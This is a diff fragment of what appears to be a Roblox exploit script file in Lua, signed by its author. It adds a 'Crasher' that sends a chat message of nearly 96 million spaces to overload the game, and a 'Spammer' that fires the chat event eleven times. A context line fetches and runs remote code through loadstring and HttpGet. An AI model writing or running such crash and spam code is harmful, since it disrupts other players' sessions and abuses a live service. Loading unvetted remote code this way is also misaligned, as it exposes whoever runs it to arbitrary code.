@@ -6,8 +6,38 @@ loadstring(game:HttpGet("https://raw.githubusercontent.com/encodyy/dvhood-test/m
 
 
 
---dvhood Crasher 
+--//Crasher
 
---//soon
+--script by encode#8010
+
+local v =96000000 --Maximal bit stream on client
+-- (96000000 - 12) -- Maximal bit stream that server accept +-2
+local msg = ""..string.rep(" ",(v - 12))
+game.Players:Chat(msg)
 
 --//
+
+HoodsK Spammer
+
+--Chat all script (Shows in main chat) made by encode#8010
+--[ Configuration ]--
+
+local message = "Flipped central >ALL"
+
+--[ Do not edit under here pls ;(]--
+
+game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(message,"LocalPlayer")
+game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(message,"LocalPlayer")
+game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(message,"LocalPlayer")
+game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(message,"LocalPlayer")
+game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(message,"LocalPlayer")
+game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(message,"LocalPlayer")
+game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(message,"LocalPlayer")
+game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(message,"LocalPlayer")
+game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(message,"LocalPlayer")
+game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(message,"LocalPlayer")
+game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(message,"LocalPlayer")
+
+
+
+--//made by encode <3
